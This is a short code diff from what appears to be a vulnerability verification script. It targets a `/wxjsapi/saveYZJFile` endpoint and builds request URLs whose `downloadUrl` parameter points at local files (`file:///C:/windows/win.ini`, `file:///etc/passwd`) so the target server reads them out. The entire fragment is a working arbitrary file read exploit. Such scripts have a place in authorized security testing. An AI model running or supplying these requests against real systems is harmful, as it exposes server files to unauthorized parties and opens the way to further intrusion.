@@ -21,7 +21,7 @@ def check(url):
     return ""
 
 def verify(site):
-    win_url = site + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
+    win_url = site + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/windows/win.ini&fileExt=txt"
     lin_url = site + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
     
     rid = check(win_url)
